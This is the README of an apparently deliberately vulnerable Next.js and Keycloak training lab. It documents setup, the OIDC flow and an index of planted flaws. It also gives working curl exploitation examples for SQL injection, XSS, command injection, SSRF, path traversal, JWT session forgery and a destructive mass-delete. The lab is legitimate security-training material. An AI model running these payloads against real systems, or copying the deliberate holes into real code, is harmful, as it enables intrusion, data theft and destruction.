# Beacon — Vulnerable Next.js + Keycloak Testbed

> **WARNING: This application contains intentional security vulnerabilities.**
> It is a penetration-testing and security-training lab. Do not deploy it to
> production, a shared host, or the public internet.

Beacon is a deliberately vulnerable **Next.js (JavaScript, App Router)** web
application backed by **PostgreSQL** and authenticated with **Keycloak OIDC**.
It is designed as a sibling testbed to `vulnerable-php-app`: a small but
coherent community app with realistic features, seeded data, and a broad set
of exploitable weaknesses.

The stack is meant to be reached only from a lab network:

| Service | URL / port | Notes |
| --- | --- | --- |
| Beacon app | <http://localhost:3000> | Next.js 16, JavaScript (no TypeScript) |
| Keycloak | <http://localhost:8081> | OIDC provider, realm `beacon` |
| Keycloak admin | <http://localhost:8081/admin> | `admin` / `admin` |
| PostgreSQL | `localhost:5432` | `beacon` / `beacon_pass`, db `beacon` |

---

## Quick start

```bash
docker compose up --build
```

The Compose stack starts four services:

1. **db** — PostgreSQL 16.
2. **seed** — one-shot `psql` job that creates the Keycloak database and loads
   the Beacon schema plus example users, notes, comments, files, and API keys.
3. **keycloak** — Keycloak 26 with the `beacon` realm imported from
   `keycloak/realm.json`.
4. **app** — the Next.js app, built and run in standalone mode.

Keycloak takes a little longer than Postgres. Wait until it answers on
<http://localhost:8081>, then open <http://localhost:3000>.

```bash
docker compose ps
docker compose logs -f app seed keycloak
```

To reset everything (including the Keycloak and Postgres volumes):

```bash
docker compose down -v
docker compose up --build
```

### Demo accounts

All seeded users exist in **both** Keycloak and the local `users` table. The
OIDC subject values are fixed in `keycloak/realm.json` and `db/init.sql`, so
SSO logins map to the seeded rows.

| Username | Password | App role | Keycloak realm role |
| --- | --- | --- | --- |
| `admin` | `admin123` | admin | admin, member |
| `alice` | `password123` | member | member |
| `bob` | `password123` | member | member |
| `carol` | `password123` | member | member |
| `dave` | `password123` | member | member |

The `/login` page also lists these accounts and provides one-click access to
the intentionally vulnerable dev-login bypass.

---

## OIDC flow

The app implements the authorization-code flow with PKCE directly. It is not a
stub and does not use a third-party auth framework.

1. `GET /api/auth/login?returnTo=…` creates `state`, `nonce`, and a PKCE
   verifier, stores them in short-lived cookies, and redirects the browser to
   Keycloak's `authorization_endpoint` on the **public issuer**:
   `http://localhost:8081/realms/beacon`.
2. Keycloak redirects back to `GET /api/auth/callback` with a code.
3. The app exchanges the code at the **internal issuer**
   (`http://keycloak:8080/realms/beacon`) so the app container can reach
   Keycloak over the Compose network.
4. The ID token is verified with `jose` against Keycloak's JWKS. The app checks
   the public `iss`, the `beacon-app` audience, the nonce, and the signature.
5. The OIDC `sub` is matched to `users.oidc_subject`. Unknown identities are
   auto-provisioned as local members.
6. The app issues its own `beacon_session` cookie: an HS256 JWT signed with
   `SESSION_SECRET`, containing the local user ID, username, and role.

The public/internal issuer split is deliberate. Browser redirects use
`localhost:8081`; server-to-server calls use `keycloak:8080`. ID tokens are
still issued with the public issuer, which is what gets verified.

### Intentional authentication bypass

The app also exposes:

```text
GET /api/auth/dev-login?username=admin&returnTo=/dashboard
```

This creates a local session for any seeded user **without a password and
without OIDC**. It exists so testers and automated scanners can reach
authenticated surfaces without scripting a Keycloak login. It is one of the
intentional vulnerabilities, not a production fallback.

---

## Vulnerability index

| # | Class | Where | Details |
| --- | --- | --- | --- |
| 1 | Reflected XSS | `/?welcome=…`, `/search?q=…`, `/members?q=…` | User input is rendered with `dangerouslySetInnerHTML`. |
| 2 | Stored XSS | Note bodies, comments, uploaded HTML files | HTML is rendered unsanitized; uploads are served inline as `text/html`. |
| 3 | SQL injection | `/search?q=`, `/members?q=`, `/api/search?q=`, `/api/notes?q=`, `/notes/[id]`, `/api/notes/[id]`, `/api/comments?noteId=` | String interpolation into SQL; errors and executed SQL are returned. |
| 4 | IDOR / broken object auth | `/notes/8`, `/api/notes/8` | Private notes are fetched by ID with no owner or visibility check. |
| 5 | Broken function auth | `/admin`, `/api/admin/users`, `/api/admin/keys`, `/api/admin/diagnostics` | Admin pages only require *any* session (or no session for APIs). |
| 6 | Mass assignment / privilege escalation | `PUT /api/profile` | Any signed-in user can update `role` (and `username`, `email`, etc.). |
| 7 | Authentication bypass | `/api/auth/dev-login` | Passwordless session creation for any seeded username. |
| 8 | Session forgery | `/api/debug` + `beacon_session` | The debug endpoint leaks `SESSION_SECRET`; sessions are HS256 JWTs. |
| 9 | Command injection | `/api/admin/diagnostics?host=…` | `host` is concatenated into `nslookup` and run through a shell. |
| 10 | SSRF | `/api/preview?url=…` | Server-side fetch of arbitrary URLs (including internal Keycloak). |
| 11 | Path traversal / arbitrary file read | `/api/files/download?name=…` | `path.resolve` is applied to caller input; absolute paths work. |
| 12 | Unrestricted upload / arbitrary file write | `POST /api/upload` | No type/size checks; caller-controlled filename can escape the upload directory. |
| 13 | Open redirect | `/api/auth/login?returnTo=…`, callback, `/api/auth/logout?returnTo=…`, dev-login | Redirect targets are not validated. |
| 14 | CSRF | Mutating APIs, GET logout/diagnostics | No CSRF tokens; handlers also accept form-encoded bodies. |
| 15 | Information disclosure | `/api/debug`, SQL errors, upload responses | Secrets, absolute paths, stack/DB errors are exposed. |
| 16 | Prototype pollution | `POST /api/preferences` | Recursive merge accepts `__proto__` and pollutes `Object.prototype`. |
| 17 | Sensitive data exposure | Admin APIs, `api_keys` table | Plaintext API keys are seeded and returned without auth. |
| 18 | Weak platform hardening | CORS, headers, Keycloak | Wildcard CORS on `/api/*`, no CSP/security headers, Keycloak brute-force protection disabled. |

A private note with a test flag is seeded as note `8`:

```text
FLAG{1d0r_private_n0te}
```

---

## Exploitation examples

All examples assume the Compose stack is running at `http://localhost:3000`.

### Passwordless login / session inspection

```bash
curl -i -c cookies.txt \
  'http://localhost:3000/api/auth/dev-login?username=admin&returnTo=/dashboard'

curl -s -b cookies.txt http://localhost:3000/api/auth/session | jq
```

### Reflected XSS

```bash
open 'http://localhost:3000/?welcome=<img src=x onerror=alert(document.domain)>'
open 'http://localhost:3000/search?q=<img src=x onerror=alert(1)>'
```

### SQL injection (search API)

The public API returns the exact SQL it ran, which makes iteration easy:

```bash
curl -s 'http://localhost:3000/api/search?q=postgres' | jq

# UNION-based dump of the plaintext API keys table
# (the leading quote + parenthesis closes the surrounding ILIKE expression)
curl -s --get 'http://localhost:3000/api/search' \
  --data-urlencode "q=') UNION SELECT 1, name, token, 'public', 1, now(), 'x' FROM api_keys -- " | jq
```

### IDOR: read the private admin note

```bash
curl -s http://localhost:3000/api/notes/8 | jq
open http://localhost:3000/notes/8
```

### Unauthenticated admin APIs

```bash
curl -s http://localhost:3000/api/admin/users | jq
curl -s http://localhost:3000/api/admin/keys | jq
```

### Privilege escalation via mass assignment

```bash
curl -i -c alice.txt \
  'http://localhost:3000/api/auth/dev-login?username=alice&returnTo=/dashboard'

curl -s -b alice.txt -X PUT http://localhost:3000/api/profile \
  -H 'content-type: application/json' \
  -d '{"role":"admin"}' | jq '.user.role'

curl -s -b alice.txt http://localhost:3000/api/auth/session | jq '.user.role'
```

### Command injection

```bash
curl -s --get 'http://localhost:3000/api/admin/diagnostics' \
  --data-urlencode 'host=localhost; id' | jq
```

### SSRF into the Compose network

```bash
curl -s --get 'http://localhost:3000/api/preview' \
  --data-urlencode 'url=http://keycloak:8080/realms/beacon/.well-known/openid-configuration' | jq
```

### Path traversal / arbitrary file read

```bash
curl -s 'http://localhost:3000/api/files/download?name=/etc/passwd'
curl -s 'http://localhost:3000/api/files/download?name=../../etc/passwd'
```

### Upload and stored XSS

```bash
printf '<script>alert(document.domain)</script>' > pwn.html

curl -s -X POST http://localhost:3000/api/upload \
  -F 'file=@pwn.html;type=text/html' \
  -F 'name=pwn.html' | jq

# Open the returned URL; it is served inline as text/html.
open 'http://localhost:3000/api/files/download?name=pwn.html'
```

### Stored XSS in a comment

```bash
curl -s -b cookies.txt -X POST http://localhost:3000/api/comments \
  -H 'content-type: application/json' \
  -d '{"noteId":1,"body":"<img src=x onerror=alert(1)>"}' | jq
```

### Open redirects

```bash
curl -i 'http://localhost:3000/api/auth/logout?returnTo=https://example.com'
curl -i 'http://localhost:3000/api/auth/dev-login?username=alice&returnTo=https://example.com'
```

The login flow also stores `returnTo` and uses it after the OIDC callback:

```bash
open 'http://localhost:3000/api/auth/login?returnTo=https://example.com'
```

### Prototype pollution

```bash
curl -s -b cookies.txt -X POST http://localhost:3000/api/preferences \
  -H 'content-type: application/json' \
  -d '{"__proto__":{"polluted":"yes"}}' | jq
```

The response includes a `polluted` field read from `Object.prototype`.

### Session forgery with the leaked secret

First read the signing secret:

```bash
SECRET=$(curl -s http://localhost:3000/api/debug | jq -r '.secrets.SESSION_SECRET')
echo "$SECRET"
```

Then mint an admin session. This uses the same `jose` dependency the app uses:

```bash
TOKEN=$(SECRET="$SECRET" node --input-type=module -e '
  import { SignJWT } from "jose";
  const secret = new TextEncoder().encode(process.env.SECRET);
  const token = await new SignJWT({ uid: 1, username: "admin", role: "admin" })
    .setProtectedHeader({ alg: "HS256", typ: "JWT" })
    .setIssuedAt()
    .setIssuer("beacon")
    .setAudience("beacon-web")
    .setExpirationTime("12h")
    .sign(secret);
  console.log(token);
')

curl -s -H "Cookie: beacon_session=$TOKEN" http://localhost:3000/api/auth/session | jq
```

### Destructive SQLi (idempotent seed can restore it)

```bash
curl -s -b cookies.txt -X DELETE 'http://localhost:3000/api/notes/1%20OR%201%3D1' | jq
```

Run `docker compose down -v && docker compose up --build` to restore the seed.

---

## Local development (without building the app in Docker)

You can run only the supporting services in Docker and the Next.js app on the
host with `npm run dev`.

```bash
docker compose up -d db seed keycloak
cp .env.example .env.local
npm install
npm run dev
```

For host-run development, both OIDC issuer values point at
`http://localhost:8081/realms/beacon` (as in `.env.example`). The Keycloak realm
registers `http://localhost:3000/api/auth/callback` as a redirect URI.

Useful commands:

```bash
npm run dev     # development server on :3000
npm run build   # production build
npm start       # serve the production build
```

### Project layout

```text
app/                    Next.js App Router pages + API route handlers
  api/auth/             OIDC login/callback/logout, dev-login, session
  api/admin/            Intentionally unprotected admin APIs
  api/notes/            Note CRUD, SQLi, IDOR
  api/files/            Vulnerable file download
  api/upload/           Unrestricted upload / arbitrary write
components/             Client forms and note cards
db/init.sql             Schema, seed users/notes/comments/keys
keycloak/realm.json     Realm, client, roles, and demo users
lib/                    Postgres pool, OIDC, sessions, helpers
uploads/                Runtime upload target (seeded welcome.txt)
docker-compose.yml      app + db + seed + Keycloak
Dockerfile              Multi-stage standalone Next.js image
```

### Data and persistence

- Postgres uses the named volume `dbdata`.
- Keycloak uses the same Postgres server, database `keycloak`.
- Uploads live inside the app container at `/app/uploads` and are **not**
  persisted across container recreation. This makes the lab easy to reset; add
  a volume if you want uploads to survive.
- The seed job is idempotent. It uses `CREATE TABLE IF NOT EXISTS` and
  `ON CONFLICT DO NOTHING`, so a normal restart does not duplicate data.

---

## Troubleshooting

**Keycloak is slow to start.** It can take 30–60 seconds on first boot. Watch
`docker compose logs -f keycloak` for `Running the server`.

**Login redirects back with an error.** Check that:
- Keycloak is reachable at <http://localhost:8081>.
- The realm is `beacon` and the client is `beacon-app`.
- `OIDC_REDIRECT_URI` is exactly
  `http://localhost:3000/api/auth/callback`.
- `OIDC_ISSUER` in the app is `http://localhost:8081/realms/beacon`.
- `OIDC_INTERNAL_ISSUER` inside Docker is
  `http://keycloak:8080/realms/beacon`.

**Port conflicts.** Change the host side of the `ports:` mappings in
`docker-compose.yml` (for example `3001:3000`) and update the Keycloak redirect
URI and `OIDC_REDIRECT_URI` to match.

**The realm changed but Keycloak did not pick it up.** Realm import runs when
the realm is first created. Reset with `docker compose down -v`.

**Postgres data looks stale.** The seed job only inserts missing rows. To start
clean, remove the volume with `docker compose down -v`.

---

## Purpose and disclaimer

Beacon is for authorized security testing, training, and tool development. It
contains deliberate SQL injection, XSS, IDOR, broken access control, SSRF,
command injection, path traversal, unrestricted uploads, open redirects,
prototype pollution, and secret exposure.

Use it only on systems you own or have explicit permission to test. Do not
expose it to the internet.
